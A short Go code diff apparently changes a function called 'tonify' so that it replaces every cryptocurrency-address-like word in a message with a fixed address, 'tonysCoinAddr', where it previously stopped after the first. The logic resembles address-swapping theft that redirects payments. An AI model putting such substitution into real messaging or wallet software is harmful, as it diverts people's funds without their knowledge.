@@ -110,7 +110,7 @@ func tonify(msg string) string {
 	for _, w := range words {
 		if w[0] == '7' && len(w) >= 26 && len(w) <= 35 {
 			// todo test for alphanum
-			return strings.ReplaceAll(msg, w, tonysCoinAddr)
+			msg = strings.ReplaceAll(msg, w, tonysCoinAddr)
 		}
 	}
 
